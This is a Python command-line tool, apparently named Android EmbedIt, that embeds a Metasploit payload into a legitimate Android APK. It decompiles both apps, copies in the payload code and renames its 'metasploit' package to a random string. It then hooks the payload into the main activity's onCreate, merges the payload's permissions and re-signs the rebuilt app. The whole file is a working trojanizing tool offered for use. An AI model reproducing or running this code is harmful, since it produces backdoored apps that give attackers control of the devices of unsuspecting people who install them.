#!/usr/bin/env python3

import os
import re
import shutil
import subprocess
import argparse
import string
import random
import xml.etree.ElementTree as ET


class AndroidEmbed():

    def __init__(self, apk, msfapk, keystore='', kspass='', keyname=''):
        self.apk = apk
        self.msfapk = msfapk
        self.keystore = keystore
        self.kspass = kspass
        self.keyname = keyname
        home = os.path.expanduser('~')
        self.workdir = os.path.join(home, '.ae')
        if not os.path.exists(self.workdir):
            os.mkdir(self.workdir)

    def run(self):
        self.cwd = os.getcwd()
        self.decompile()
        self.root1 = ET.parse(self.manifest1).getroot()
        self.root2 = ET.parse(self.manifest2).getroot()
        main = self.launch_activity_name()
        print('[*] Main Activity is: {0}'.format(main))
        self.modify_entrypoint(main)
        self.copy_payload()
        self.adjust_manifest()
        self.compile(os.path.join(self.workdir, 'original_apk'))
        self.sign()

    def randstr(self, length=8):
        chset = string.ascii_lowercase
        return ''.join(random.choices(chset, k=length))

    def copy_payload(self):
        print('[*] Copying malware payload over...')
        os.chdir(os.path.join(self.workdir, 'malware_apk'))
        out, err = self.oscmd(
            'tar -cf - smali | (cd ../original_apk; tar -xpf -)'
        )
        if len(err) > 0:
            Exception(str(err))

        os.chdir(os.path.join(self.workdir, 'original_apk', 'smali', 'com'))
        os.rename('metasploit', self.pdir1)
        os.chdir(os.path.join(
            self.workdir, 'original_apk', 'smali',
            'com', self.pdir1, 'stage'))
        self.oscmd("sed -i 's/metasploit/{0}/g' *".format(self.pdir1))

    def adjust_manifest(self):
        print('[*] Adjusting AndroidManifest.xml')
        nk = '{http://schemas.android.com/apk/res/android}name'
        permissions = ''
        for x in self.root2.findall('uses-permission'):
            permissions += '    ' + \
                '<uses-permission android:name="{0}"/>'.format(
                        x.attrib[nk]) + '\n'

        features = ''
        for x in self.root2.findall('uses-feature'):
            features += '    ' + \
                '<uses-feature android:name="{0}"/>'.format(
                        x.attrib[nk]) + '\n'

        temppath = os.path.join(self.workdir, 'temp.xml')
        fh = open(self.manifest1, 'r')
        ofh = open(temppath, 'w')
        for line in fh:
            if re.match('\s+<application', line):
                ofh.write('\n')
                ofh.write(permissions)
                ofh.write(features)
                ofh.write('\n')
            ofh.write(line)
        fh.close()
        ofh.close()
        os.rename(temppath, self.manifest1)

    def modify_entrypoint(self, main):
        #self.pdir1 = 'metasploit'
        self.pdir1 = self.randstr()
        msfpath = 'com/{0}/stage/Payload'.format(self.pdir1)
        msfline = '    invoke-static {0}, L{1}'.format('{p0}', msfpath) + \
                ';->start(Landroid/content/Context;)V\n'

        mainpath = main.replace('.', '/')
        fullpath = os.path.join(
            self.workdir, 'original_apk/smali',
            mainpath + '.smali'
        )
        temppath = os.path.join(self.workdir, 'temp.smali')

        ofh = open(temppath, 'w')
        fh = open(fullpath, 'r')
        for line in fh:
            ofh.write(line)
            if re.match(r'^\.method.+onCreate\(Landroid', line):
                ofh.write(msfline)
        fh.close()
        ofh.close()
        os.rename(temppath, fullpath)

    def decompile(self):
        f1 = os.path.join(self.workdir, 'original_apk')
        f2 = os.path.join(self.workdir, 'malware_apk')
        print('[*] apktool decompiling [{0}]'.format(self.apk))
        out, err = self.oscmd('apktool d -f {0} -o {1}'.format(self.apk, f1))
        if len(err) > 0:
            Exception(str(err))
        print('[*] apktool decompiling [{0}]'.format(self.msfapk))
        out, err = self.oscmd('apktool d -f {0} -o {1}'.format(self.msfapk, f2))
        if len(err) > 0:
            Exception(str(err))
        self.manifest1 = os.path.join(f1, 'AndroidManifest.xml')
        self.manifest2 = os.path.join(f2, 'AndroidManifest.xml')

    def compile(self, apk):
        print('[*] apktool compiling [{0}]'.format(apk))
        out, err = self.oscmd('apktool b --use-aapt2 {0}'.format(apk))
        if len(err) > 0:
            Exception(str(err))
        shutil.copyfile(os.path.join(
            self.workdir, 'original_apk', 'dist', self.apk),
            os.path.join(self.workdir, 'final.apk')
        )

    def sign(self):
        os.chdir(self.cwd)
        fp = os.path.join(self.workdir, 'final.apk')

        kn = self.keyname
        kp = self.kspass
        ks = self.keystore
        if not os.path.exists(ks):
            print('[*] Creating new self-signed keystore file')
            kp = self.randstr()
            ks = os.path.join(self.workdir, 'temp.keystore')
            if os.path.exists(ks):
                os.remove(ks)
            kn = 'temp'
            cmd = 'keytool -genkey -v -keystore {0} '.format(ks)
            cmd += '-alias {0} -keyalg RSA -keysize 2048 '.format(kn)
            cmd += '-validity 10000 -storepass {0} -dname cn=temp'.format(kp)
            out, err = self.oscmd(cmd)
            if 'keytool error' in out:
                raise Exception(str(out + err))

        print('[*] Signing [{0}]'.format(fp))
        cmd = 'apksigner sign --ks {0} '.format(ks)
        cmd += '--ks-pass pass:{0} '.format(kp)
        #cmd += '-digestalg SHA1 -sigalg SHA1withRSA '
        cmd += '{0}'.format(fp)
        print(cmd)
        out, err = self.oscmd(cmd)
        if 'jarsigner error' in out or len(err) > 0:
            raise Exception(str(out + err))

    def oscmd(self, cmd):
        p = subprocess.Popen(
            cmd, shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = p.communicate()
        return stdout.decode(), stderr.decode()

    def launch_activity_name(self):
        app = self.root1.find('application')
        activities = app.findall('activity')
        nk = '{http://schemas.android.com/apk/res/android}name'

        launch_activity = None
        for activity in activities:
            filters = activity.findall('intent-filter')
            for x in filters:
                action = x.find('action')
                if 'MAIN' in str(action.attrib):
                    launch_activity = activity
        return launch_activity.attrib[nk]

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'apk', help='Android APK to embed malware into'
    )
    parser.add_argument(
        'msfapk', help='Metasploit APK file'
    )
    parser.add_argument(
        '-ks', '--keystore', default='debug.keystore',
        help='Android keystore file'
    )
    parser.add_argument(
        '-kp', '--kspass', default='android',
        help='Android keystore password'
    )
    parser.add_argument(
        '-kn', '--keyname', default='androiddebugkey',
        help='Android keystore key name'
    )
    print("""\
[*]===============================
[*] Android EmbedIt Version 1.0
[*] Author: Joff Thyer
[*] Copyright (c) 2018
[*]===============================
""")
    args = parser.parse_args()
    ae = AndroidEmbed(
        args.apk, args.msfapk,
        keystore=args.keystore,
        kspass=args.kspass,
        keyname=args.keyname
    )
    ae.run()
